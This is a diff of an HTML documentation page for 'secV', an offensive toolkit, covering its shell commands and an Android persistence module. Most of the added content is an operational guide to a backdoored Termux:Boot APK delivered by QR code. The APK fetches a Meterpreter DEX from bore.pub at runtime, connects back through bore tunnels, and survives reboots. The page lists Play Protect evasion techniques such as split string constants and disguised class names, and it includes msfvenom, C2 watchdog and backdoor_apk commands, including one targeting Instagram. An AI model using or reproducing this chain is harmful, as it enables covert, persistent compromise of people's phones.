+    and print findings. The findings are plain Python dictionaries serialised to JSON and
+    prefixed with <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">FINDING:</code>.
+  </p>
+  <pre><code><span class="kw">import</span> json, sys
+
+<span class="cm"># Read the shell's dispatch payload</span>
+data   = json.loads(sys.stdin.readline())
+target = data.get(<span class="st">"target"</span>, <span class="st">""</span>)
+params = data.get(<span class="st">"params"</span>, {})
+op     = params.get(<span class="st">"operation"</span>, <span class="st">"recon"</span>)
+
+<span class="cm"># Dispatch table - each operation is its own method</span>
+ops = {
+    <span class="st">"recon"</span>:          self._recon_operation,
+    <span class="st">"static_analysis"</span>: self._static_analysis_operation,
+    <span class="st">"backdoor_apk"</span>:   self._backdoor_apk_operation,
+    <span class="st">"rebuild"</span>:         self._rebuild_apk_operation,
+}
+
+handler = ops.get(op)
+<span class="kw">if</span> handler:
+    handler()
+<span class="kw">else</span>:
+    print(<span class="st">f"[!] Unknown operation: {op}"</span>)
+
+<span class="cm"># Emit all collected findings</span>
+<span class="kw">for</span> f <span class="kw">in</span> self.findings:
+    print(<span class="st">f"FINDING: {json.dumps(f)}"</span>)</code></pre>
+
+  <h3>Operation Dispatch in android_pentest</h3>
+  <p class="body-text">
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">android_pentest.py</code> exposes 26 operations, each mapped to a private method.
+    Operations are grouped by purpose - recon, analysis, exploitation, persistence, and delivery.
+    The method naming convention is always <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">_&lt;operation_name&gt;_operation(self)</code>.
+    All shared state (device info, findings list, errors, log lines) lives on the
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">AndroidPentest</code> class instance.
+  </p>
+  <pre><code><span class="cm"># android_pentest.py - operation registry (simplified)</span>
+_OPS = {
+    <span class="st">"recon"</span>:               <span class="st"># ADB device fingerprint, OS, arch, root status</span>
+    <span class="st">"static_analysis"</span>:    <span class="st"># pull APK → apktool → jadx → secret scan</span>
+    <span class="st">"permissions_audit"</span>:  <span class="st"># parse dumpsys → flag dangerous permissions</span>
+    <span class="st">"backdoor_apk"</span>:       <span class="st"># smali patch → sign → push</span>
+    <span class="st">"rebuild"</span>:             <span class="st"># build_bootbuddy.py → DexClassLoader APK + QR</span>
+    <span class="st">"frida_attach"</span>:       <span class="st"># spawn frida-server → attach to PID</span>
+    <span class="st">"ssl_bypass"</span>:         <span class="st"># objection SSL pinning disable</span>
+    <span class="st">"logcat_leak"</span>:        <span class="st"># read logcat → grep secrets, tokens, credentials</span>
+    <span class="st">"content_provider"</span>:   <span class="st"># enumerate exported providers → SQL injection test</span>
+    <span class="st">"network_capture"</span>:    <span class="st"># tcpdump via root → pcap to attacker</span>
+    <span class="st">"qr_exploit"</span>:         <span class="st"># generate QR for APK URL delivery</span>
+    <span class="cm">// ... 15 more operations</span>
+}</code></pre>
+
+  <h3>The ADB Bridge</h3>
+  <p class="body-text">
+    Most android_pentest operations route through the same internal ADB helper.
+    It wraps <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">subprocess.run(["adb", ...], capture_output=True)</code>
+    and parses the output. Device discovery runs automatically before any operation
+    that requires a connected device - if no device is found, the operation
+    fails with a clear error rather than silently producing garbage output.
+  </p>
+  <pre><code><span class="kw">def</span> _adb(self, *args) -> subprocess.CompletedProcess:
+    cmd = [<span class="st">"adb"</span>]
+    <span class="kw">if</span> self.device_serial:
+        cmd += [<span class="st">"-s"</span>, self.device_serial]
+    cmd += list(args)
+    <span class="kw">return</span> subprocess.run(cmd, capture_output=True, text=True, timeout=30)
+
+<span class="kw">def</span> _shell(self, *cmd) -> str:
+    r = self._adb(<span class="st">"shell"</span>, *cmd)
+    <span class="kw">return</span> r.stdout.strip()
+
+<span class="cm"># Usage inside an operation:</span>
+arch = self._shell(<span class="st">"getprop ro.product.cpu.abi"</span>)
+sdk  = self._shell(<span class="st">"getprop ro.build.version.sdk"</span>)</code></pre>
+
+</div>
+
+<hr class="rule">
+
+<!-- C2 Stack -->
+<div class="wrap" id="c2stack">
+  <p class="section-label">Android C2</p>
+  <h2>C2 Stack &amp; APK Persistence</h2>
+
+  <p class="body-text">
+    The Android persistence chain is the most technically complex part of secV.
+    It uses several layered techniques to achieve boot-persistent Meterpreter sessions
+    over WAN without embedding any detectable payload statically in the APK.
+    This section documents every component of that chain - what it does, why it works,
+    and how each piece connects to the next.
+  </p>
+
+  <div class="callout">
+    <strong>Design goal:</strong> The rebuilt APK must pass Play Protect static analysis,
+    survive a device reboot, fetch the real Meterpreter payload from a WAN endpoint without
+    storing it on disk permanently, and open a session through carrier NAT.
+  </div>
+
+  <h3>The Four-Layer Chain</h3>
+
+  <div class="chain">
+    <div class="chain-step">
+      <div class="chain-num">01</div>
+      <div>
+        <div class="chain-content-title">Termux:Boot → BOOT_COMPLETED receiver</div>
+        <div class="chain-content-body">
+          The legitimate Termux:Boot APK is patched by
+          <span class="chain-content-code">build_bootbuddy.py</span>. The
+          <span class="chain-content-code">BootReceiver.onReceive()</span> smali is modified
+          to call <span class="chain-content-code">startForegroundService(AgentService)</span>
+          immediately on <span class="chain-content-code">BOOT_COMPLETED</span>.
+          The <span class="chain-content-code">exported="true"</span> flag is also set -
+          required on Android 11+ for the broadcast to be delivered.
+          A foreground service is necessary from API 26+ because background service starts
+          from broadcast receivers are blocked.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">02</div>
+      <div>
+        <div class="chain-content-title">AgentService → foreground service context</div>
+        <div class="chain-content-body">
+          <span class="chain-content-code">AgentService.smali</span> is injected into the APK.
+          Its <span class="chain-content-code">onStartCommand()</span> creates a notification
+          channel (<span class="chain-content-code">"secv"</span>), calls
+          <span class="chain-content-code">startForeground()</span> to satisfy API 28+
+          foreground-service requirements, then invokes
+          <span class="chain-content-code">BootReceiver.launchAgent()</span>
+          (which starts the secV agent script from disk) and
+          <span class="chain-content-code">Payload.start(context)</span>
+          (which kicks off the DexClassLoader chain in a daemon thread).
+          Running inside a Service gives the payload a long-lived Android context - critical
+          because BroadcastReceivers are killed after ~10 seconds.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">03</div>
+      <div>
+        <div class="chain-content-title">DexClassLoader Payload → runtime DEX fetch</div>
+        <div class="chain-content-body">
+          <span class="chain-content-code">com.android.system.health.Payload</span> is injected
+          as a smali file by <span class="chain-content-code">gen_dexloader_smali()</span>.
+          Its <span class="chain-content-code">run()</span> method opens a URL connection to
+          <span class="chain-content-code">http://bore.pub:21062/s.dex</span>
+          (the URL is split across two string constants to avoid a single suspicious literal),
+          writes the bytes to <span class="chain-content-code">getCodeCacheDir()/s.dex</span>,
+          then loads it with <span class="chain-content-code">DexClassLoader</span> and calls
+          <span class="chain-content-code">com.metasploit.stage.Payload.start(context)</span>
+          via reflection. On failure it sleeps 5 seconds and retries indefinitely -
+          the session opens as soon as the device gets network after boot.
+          No Meterpreter code is ever present in the APK itself.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">04</div>
+      <div>
+        <div class="chain-content-title">s.dex → reverse_http Meterpreter via bore tunnel</div>
+        <div class="chain-content-body">
+          <span class="chain-content-code">s.dex</span> is generated by
+          <span class="chain-content-code">gen_sdex()</span> using
+          <span class="chain-content-code">msfvenom -p android/meterpreter/reverse_http</span>
+          targeting <span class="chain-content-code">bore.pub:37993</span> (the bore MSF tunnel).
+          <span class="chain-content-code">reverse_http</span> is chosen over
+          <span class="chain-content-code">reverse_tcp</span> because HTTP traffic survives
+          carrier NAT and DPI more reliably on mobile networks. The bore tunnel at
+          <span class="chain-content-code">bore.pub:37993</span> forwards to
+          <span class="chain-content-code">localhost:4444</span> on the attacker machine
+          where msfconsole (or the watchdog-managed handler) is listening.
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <h3>c2_watchdog.sh - The Stack Manager</h3>
+  <p class="body-text">
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">c2_watchdog.sh</code>
+    manages four processes simultaneously and restarts any that die. It is the single command
+    needed on the attacker machine to bring up the entire C2 stack.
+  </p>
+
+  <div class="info-grid">
+    <div class="info-card">
+      <div class="info-card-num" style="font-size:1rem">HTTP</div>
+      <div class="info-card-title">DEX file server</div>
+      <div class="info-card-body">
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">python3 -m http.server 8080</code>
+        serving the <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">output/</code> directory.
+        Serves both <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">s.dex</code> (Meterpreter) and
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">rebuilt.apk</code> (QR delivery).
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num" style="font-size:1rem">BORE</div>
+      <div class="info-card-title">DEX bore tunnel</div>
+      <div class="info-card-body">
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore local 8080 --to bore.pub --port 21062</code>
+        tunnels <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore.pub:21062</code> →
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">localhost:8080</code>.
+        The device's DexClassLoader fetches s.dex through this URL.
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num" style="font-size:1rem">BORE</div>
+      <div class="info-card-title">MSF bore tunnel</div>
+      <div class="info-card-body">
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore local 4444 --to bore.pub --port 37993</code>
+        tunnels <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">bore.pub:37993</code> →
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">localhost:4444</code>.
+        The Meterpreter in s.dex calls back through this tunnel.
+      </div>
+    </div>
+    <div class="info-card">
+      <div class="info-card-num" style="font-size:1rem">MSF</div>
+      <div class="info-card-title">msfconsole handler</div>
+      <div class="info-card-body">
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">msfconsole -q -r handler.rc</code> running
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">multi/handler</code> on
+        <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">0.0.0.0:4444</code>
+        with payload <code style="font-size:0.62rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.02rem 0.22rem">android/meterpreter/reverse_http</code>.
+      </div>
+    </div>
+  </div>
+
+  <pre><code><span class="cm"># Start the full C2 stack</span>
+bash tools/mobile/android/c2_persistence/c2_watchdog.sh \
+  --bore-dex-port <span class="nu">21062</span> \
+  --bore-msf-port <span class="nu">37993</span> \
+  --msf-port      <span class="nu">4444</span>  \
+  --dex-dir       tools/mobile/android/apk_backdoor/output/ \
+  --notify
+
+<span class="cm"># Or as a systemd service (persistent across reboots)</span>
+sudo systemctl enable --now secv-c2
+sudo journalctl -u secv-c2 -f</code></pre>
+
+  <h3>APK Delivery via QR</h3>
+  <p class="body-text">
+    After <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">build_bootbuddy.py</code> finishes building, it
+    automatically generates a QR code encoding the WAN APK URL
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">http://bore.pub:21062/rebuilt.apk</code>.
+    The APK is served by the same DEX HTTP server that the watchdog manages - the
+    <code style="font-size:0.72rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.04rem 0.3rem">output/</code> directory contains both files.
+    Once the watchdog is running, the target device only needs to scan the QR code with
+    any camera app, open the link, and install the APK. ADB is not required.
+  </p>
+
+  <pre><code><span class="cm"># QR is printed to terminal on every build</span>
+secV (android_pentest) › rebuild ❯ run device
+
+[+] Done.
+    Patched APK : output/rebuilt.apk
+    s.dex       : output/s.dex  (20348 bytes)
+
+    APK delivery URL:
+      http://bore.pub:21062/rebuilt.apk
+
+    ══════════════════════════════════════════════════════
+    SCAN TO INSTALL
+    ══════════════════════════════════════════════════════
+    █▀▀▀▀▀█  ▀▀█▄▀▀█ █▄ ▄ █▀▀▀▀▀█
+    █ ███ █ ▄▀██  █▄▀▄▀██ █ ███ █
+    ...
+    QR PNG saved: output/apk_delivery.png</code></pre>
+
+  <h3>Play Protect Evasion</h3>
+  <p class="body-text">
+    Several specific decisions in the build chain exist to evade Play Protect and on-device
+    antivirus. These are worth understanding if you are tuning the chain or debugging
+    detection issues.
+  </p>
+
+  <div class="chain">
+    <div class="chain-step">
+      <div class="chain-num">A</div>
+      <div>
+        <div class="chain-content-title">No static Meterpreter in APK</div>
+        <div class="chain-content-body">
+          The APK contains only the DexClassLoader fetcher - not the Meterpreter itself.
+          Play Protect's static DEX scanner finds nothing to flag because there are no
+          Metasploit signatures in the installed package. The real payload (s.dex) is
+          fetched at runtime and written to <span class="chain-content-code">getCodeCacheDir()</span>
+          which is not scanned by Play Protect during boot.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">B</div>
+      <div>
+        <div class="chain-content-title">URL split across two string constants</div>
+        <div class="chain-content-body">
+          The smali for the DEX fetch URL is
+          <span class="chain-content-code">const-string v0, "http://bore"</span> +
+          <span class="chain-content-code">const-string v1, ".pub:21062/s.dex"</span>
+          concatenated at runtime. A single
+          <span class="chain-content-code">http://bore.pub:21062/s.dex</span>
+          constant would be trivially flagged by string-matching scanners.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">C</div>
+      <div>
+        <div class="chain-content-title">ProcessBuilder + split command string in launchAgent()</div>
+        <div class="chain-content-body">
+          The boot script launcher uses
+          <span class="chain-content-code">ProcessBuilder</span> (less heuristically flagged
+          than <span class="chain-content-code">Runtime.exec()</span>) and splits the shell
+          command string at the midpoint so no single suspicious string constant is visible
+          to static analysis. The halves are concatenated at runtime via
+          <span class="chain-content-code">String.concat()</span>.
+        </div>
+      </div>
+    </div>
+    <div class="chain-step">
+      <div class="chain-num">D</div>
+      <div>
+        <div class="chain-content-title">Disguised class names</div>
+        <div class="chain-content-body">
+          The DexClassLoader injected class is placed at
+          <span class="chain-content-code">com.android.system.health.Payload</span> - a path
+          that resembles a legitimate Android system health service.
+          <span class="chain-content-code">AgentService</span> lives at
+          <span class="chain-content-code">com.termux.boot.AgentService</span> - part of the
+          Termux:Boot package namespace, indistinguishable from a real Termux component.
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<hr class="rule">
+
+<!-- Shell Reference -->
 <div class="wrap" id="shell">
   <p class="section-label">Shell Reference</p>
   <h2>secV Shell</h2>
@@ -725,31 +1496,31 @@ footer {
   <div class="shell-section">
     <div class="shell-header">
       <span class="shell-title">Module Commands</span>
-      <span class="shell-version">v2.4.0+</span>
+      <span class="shell-version">v2.5.0+</span>
     </div>
     <table class="cmd-table">
       <tr class="cmd-group-header"><td colspan="2">Loading Modules</td></tr>
-      <tr><td>use &lt;module&gt;</td><td>Load a module by name (e.g. <code>use netrecon</code>)</td></tr>
+      <tr><td>use &lt;module&gt;</td><td>Load a module by name (e.g. <code>use netrecon</code>). Tab completes module names from the tools/ discovery scan.</td></tr>
       <tr><td>back</td><td>Unload the current module and clear params. Equivalent to <code>cd ..</code></td></tr>
-      <tr><td>reload</td><td>Rescan the tools directory for new modules</td></tr>
+      <tr><td>reload</td><td>Rescan the tools directory for new or updated modules without restarting</td></tr>
 
       <tr class="cmd-group-header"><td colspan="2">Configuration</td></tr>
-      <tr><td>set &lt;param&gt; &lt;value&gt;</td><td>Set a module parameter. <strong>First token after <code>set</code> is the key.</strong> E.g. <code>set operation backdoor_apk</code></td></tr>
-      <tr><td>unset &lt;param&gt;</td><td>Clear a parameter</td></tr>
-      <tr><td>show options</td><td>List all parameters with types, required flags, and current values</td></tr>
+      <tr><td>set &lt;param&gt; &lt;value&gt;</td><td>Set a module parameter. <strong>First token after <code>set</code> is always the key.</strong> Values with spaces do not need quotes. E.g. <code>set operation backdoor_apk</code></td></tr>
+      <tr><td>unset &lt;param&gt;</td><td>Clear a single parameter</td></tr>
+      <tr><td>show options</td><td>List all parameters: name, type, required flag, current value, and help text</td></tr>
 
       <tr class="cmd-group-header"><td colspan="2">Execution</td></tr>
-      <tr><td>run &lt;target&gt;</td><td>Execute the loaded module against target (IP, hostname, device, etc.)</td></tr>
+      <tr><td>run &lt;target&gt;</td><td>Execute the loaded module. Target is an IP, hostname, device serial, domain, or keyword (<code>connected</code>, <code>device</code>)</td></tr>
 
       <tr class="cmd-group-header"><td colspan="2">Information</td></tr>
       <tr><td>show modules</td><td>List all available modules grouped by category</td></tr>
-      <tr><td>info [module]</td><td>Module details, version, author, and dependency status</td></tr>
-      <tr><td>search &lt;keyword&gt;</td><td>Search modules by name, description, or category</td></tr>
-      <tr><td>help module</td><td>Show full help for the currently loaded module</td></tr>
-      <tr><td>sessions [list|interact &lt;id&gt;|kill &lt;id&gt;]</td><td>Manage active Meterpreter / shell sessions</td></tr>
+      <tr><td>info [module]</td><td>Module details, version, author, dependency status, and example commands</td></tr>
+      <tr><td>search &lt;keyword&gt;</td><td>Search modules by name, description, category, or tag</td></tr>
+      <tr><td>help module</td><td>Show full help for the currently loaded module including all operations</td></tr>
+      <tr><td>sessions [list|interact &lt;id&gt;|kill &lt;id&gt;]</td><td>Manage active Meterpreter / shell sessions opened through android_pentest</td></tr>
 
-      <tr class="cmd-group-header"><td colspan="2">System</td></tr>
-      <tr><td>update</td><td>Pull the latest version from git (runs update.py)</td></tr>
+      <tr class="cmd-group-header"><td colspan="2">Maintenance</td></tr>
+      <tr><td>update</td><td>Pull the latest version from git (runs <code>update.py</code> - rebuilds binary, syncs tool permissions)</td></tr>
       <tr><td>clear</td><td>Clear the terminal screen</td></tr>
       <tr><td>exit / quit</td><td>Exit secV</td></tr>
     </table>
@@ -762,11 +1533,9 @@ footer {
     </div>
     <p style="font-size:0.76rem;color:var(--muted);margin-bottom:1.4rem;line-height:1.8">
       All standard Linux commands work natively inside secV. The shell tracks a working directory
-      so commands like <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">ls</code>,
-      <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cat</code>, and
-      <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">find</code>
-      operate on the correct path. Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code>
-      to navigate up — if a module is loaded, this unloads it (same as <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code>).
+      and passes unknown commands through to the OS via <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">exec.Command</code>.
+      Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code>
+      to navigate up - if a module is loaded, this unloads it (same as <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code>).
     </p>
     <table class="cmd-table">
       <tr class="cmd-group-header"><td colspan="2">Directory Navigation</td></tr>
@@ -779,27 +1548,19 @@ footer {
       <tr><td>ls [path]</td><td>List directory contents</td></tr>
       <tr><td>ll / la</td><td>Long listing with hidden files</td></tr>
       <tr><td>mkdir &lt;dir&gt;</td><td>Create a directory</td></tr>
-      <tr><td>mv &lt;src&gt; &lt;dst&gt;</td><td>Move or rename a file</td></tr>
-      <tr><td>cp &lt;src&gt; &lt;dst&gt;</td><td>Copy a file</td></tr>
-      <tr><td>rm &lt;file&gt;</td><td>Remove a file</td></tr>
-      <tr><td>touch &lt;file&gt;</td><td>Create an empty file or update timestamp</td></tr>
+      <tr><td>mv / cp / rm</td><td>Move, copy, or delete files</td></tr>
+      <tr><td>touch &lt;file&gt;</td><td>Create empty file or update timestamp</td></tr>
 
-      <tr class="cmd-group-header"><td colspan="2">Viewing Files</td></tr>
-      <tr><td>cat &lt;file&gt;</td><td>Print file contents</td></tr>
-      <tr><td>less &lt;file&gt;</td><td>Page through file contents</td></tr>
-      <tr><td>head / tail</td><td>View beginning or end of a file</td></tr>
-
-      <tr class="cmd-group-header"><td colspan="2">Search &amp; Info</td></tr>
-      <tr><td>find &lt;path&gt; -name "…"</td><td>Find files by name or pattern</td></tr>
+      <tr class="cmd-group-header"><td colspan="2">Viewing &amp; Search</td></tr>
+      <tr><td>cat / less</td><td>Print or page file contents</td></tr>
+      <tr><td>head / tail</td><td>View start or end of a file</td></tr>
       <tr><td>grep "&lt;pattern&gt;" &lt;file&gt;</td><td>Search file contents</td></tr>
-      <tr><td>file &lt;path&gt;</td><td>Identify file type</td></tr>
-      <tr><td>stat &lt;path&gt;</td><td>Detailed file/directory metadata</td></tr>
-      <tr><td>which &lt;binary&gt;</td><td>Find the path of a command</td></tr>
-      <tr><td>whoami / id</td><td>Current user identity</td></tr>
+      <tr><td>find &lt;path&gt; -name "…"</td><td>Find files by name or pattern</td></tr>
 
-      <tr class="cmd-group-header"><td colspan="2">Permissions</td></tr>
-      <tr><td>chmod &lt;mode&gt; &lt;file&gt;</td><td>Change file permissions</td></tr>
-      <tr><td>chown &lt;user&gt;:&lt;group&gt; &lt;file&gt;</td><td>Change file ownership</td></tr>
+      <tr class="cmd-group-header"><td colspan="2">System Info</td></tr>
+      <tr><td>which &lt;binary&gt;</td><td>Find binary on PATH</td></tr>
+      <tr><td>whoami / id</td><td>Current user identity</td></tr>
+      <tr><td>chmod / chown</td><td>Change file permissions or ownership</td></tr>
     </table>
   </div>
 
@@ -808,25 +1569,28 @@ footer {
       <span class="shell-title">Prompt Reference</span>
     </div>
     <p style="font-size:0.76rem;color:var(--muted);margin-bottom:1rem;line-height:1.8">
-      The prompt adapts to show what is loaded and how many parameters are currently set.
+      The prompt adapts to show context: loaded module, active operation, and parameter count.
     </p>
     <pre><code><span class="cm"># No module loaded</span>
 <span class="hl">secV</span> ❯
 
 <span class="cm"># Module loaded, no params set</span>
-<span class="hl">secV</span> <span style="color:#8aabcc">android_pentest</span> ❯
+<span class="hl">secV</span> <span class="kw">android_pentest</span> ❯
 
-<span class="cm"># Module loaded, operation set</span>
-<span class="hl">secV</span> <span style="color:#8aabcc">android_pentest</span> <span style="color:#585858">›</span> <span style="color:#b09048">backdoor_apk</span> [2 params] ❯
+<span class="cm"># Module loaded, operation set, 3 params</span>
+<span class="hl">secV</span> <span class="kw">android_pentest</span> <span style="color:#585858">›</span> <span class="st">rebuild</span> [3 params] ❯
 
-<span class="cm"># Module loaded, custom operation</span>
-<span class="hl">secV</span> <span style="color:#8aabcc">netrecon</span> <span style="color:#585858">›</span> <span style="color:#b09048">full</span> [3 params] ❯</code></pre>
+<span class="cm"># After set msf true</span>
+<span class="hl">secV</span> <span class="kw">android_pentest</span> <span style="color:#585858">›</span> <span class="st">rebuild</span> [4 params] ❯
+
+<span class="cm"># Scan in progress</span>
+<span class="hl">secV</span> <span class="kw">netrecon</span> <span style="color:#585858">›</span> <span class="st">full</span> [3 params] ❯</code></pre>
   </div>
 </div>
 
 <hr class="rule">
 
-<!-- Quick start -->
+<!-- Quickstart -->
 <div class="wrap" id="quickstart">
   <p class="section-label">Getting Started</p>
   <h2>Quickstart</h2>
@@ -838,7 +1602,7 @@ footer {
         <div class="step-num">01</div>
         <div class="step-content">
           <div class="step-title">Install secV</div>
-          <div class="step-body">Clone the repo and run the install script. It detects your distro and offers to install missing dependencies automatically.</div>
+          <div class="step-body">Clone the repo and run the install script. It detects your distro, installs missing dependencies, compiles the Go binary, and makes all module scripts executable.</div>
           <pre><code><span class="hl">git clone</span> https://github.com/secvulnhub/secV
 <span class="hl">cd</span> secV
 <span class="hl">bash</span> install.sh</code></pre>
@@ -849,48 +1613,65 @@ footer {
         <div class="step-num">02</div>
         <div class="step-content">
           <div class="step-title">Launch the shell</div>
-          <div class="step-body">Run the <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">secV</code> binary. It auto-scans the tools directory and loads all modules.</div>
-          <pre><code><span class="hl">./secV</span>        <span class="cm"># from the repo directory</span>
-<span class="hl">secV</span>          <span class="cm"># if installed system-wide</span></code></pre>
+          <div class="step-body">Run the <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">secV</code> binary. It auto-scans tools/ and loads all modules with tab-completion.</div>
+          <pre><code><span class="hl">./secV</span>        <span class="cm"># from repo directory</span>
+<span class="hl">secV</span>          <span class="cm"># if installed system-wide (install.sh option)</span></code></pre>
         </div>
       </div>
 
       <div class="step">
         <div class="step-num">03</div>
         <div class="step-content">
-          <div class="step-title">Load a module</div>
-          <div class="step-body">Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">use &lt;name&gt;</code> to load any module. Tab completes module names.</div>
+          <div class="step-title">Network recon</div>
+          <div class="step-body">Scan a subnet, enumerate hosts, map open ports, detect device types, and pull live CVEs from NVD.</div>
           <pre><code><span class="hl">use</span> netrecon
-<span class="hl">show</span> options</code></pre>
+<span class="hl">set</span> mode deep
+<span class="hl">set</span> threads 30
+<span class="hl">run</span> 192.168.1.0/24</code></pre>
         </div>
       </div>
 
       <div class="step">
         <div class="step-num">04</div>
         <div class="step-content">
-          <div class="step-title">Configure and run</div>
-          <div class="step-body">Set parameters with <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">set &lt;param&gt; &lt;value&gt;</code>. The first token after <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">set</code> is always the parameter name — not the module name.</div>
-          <pre><code><span class="cm"># Network scan</span>
-<span class="hl">set</span> mode deep
-<span class="hl">set</span> threads 30
-<span class="hl">run</span> 192.168.1.0/24
+          <div class="step-title">Android WAN C2 (boot persistence)</div>
+          <div class="step-body">Patch Termux:Boot, generate s.dex, get QR for delivery. Device connects back on every reboot via bore tunnels.</div>
+          <pre><code><span class="hl">use</span> android_pentest
+<span class="hl">set</span> operation rebuild
+<span class="hl">set</span> msf true
+<span class="hl">set</span> msf_lport 4444
+<span class="hl">run</span> device           <span class="cm"># builds APK + s.dex + QR</span>
 
-<span class="cm"># Android backdoor</span>
-<span class="hl">use</span> android_pentest
-<span class="hl">set</span> operation backdoor_apk
-<span class="hl">set</span> package com.instagram.android
-<span class="hl">run</span> connected</code></pre>
+<span class="cm"># Start C2 stack (bore + MSF handler)</span>
+<span class="hl">bash</span> tools/mobile/android/c2_persistence/c2_watchdog.sh \
+  --bore-dex-port 21062 --bore-msf-port 37993 \
+  --msf-port 4444 --dex-dir tools/mobile/android/apk_backdoor/output/ --notify
+
+<span class="cm"># Install: scan the QR → browser → install → reboot</span></code></pre>
         </div>
       </div>
 
       <div class="step">
         <div class="step-num">05</div>
         <div class="step-content">
+          <div class="step-title">WiFi network monitoring</div>
+          <div class="step-body">Discover all hosts on a WiFi segment, fingerprint device categories, detect exposed threats like Telnet, FTP, or Redis.</div>
+          <pre><code><span class="hl">use</span> wifi_monitor
+<span class="hl">set</span> mode full
+<span class="hl">set</span> interface wlan0
+<span class="hl">run</span> 192.168.1.0/24</code></pre>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">06</div>
+        <div class="step-content">
           <div class="step-title">Navigate like Linux</div>
-          <div class="step-body">Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code> or <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code> to unload a module. Regular Linux commands like <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">ls</code>, <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cat</code>, <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">grep</code> work natively.</div>
+          <div class="step-body">Use <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">back</code> or <code style="font-size:0.7rem;color:var(--off);background:var(--bg2);border:1px solid var(--border);padding:0.05rem 0.3rem">cd ..</code> to unload a module. Regular Linux commands work directly.</div>
           <pre><code><span class="hl">ls</span> tools/network/
 <span class="hl">cat</span> tools/network/netrecon/module.json
-<span class="hl">back</span>      <span class="cm"># or: cd ..</span></code></pre>
+<span class="hl">back</span>      <span class="cm"># or: cd ..</span>
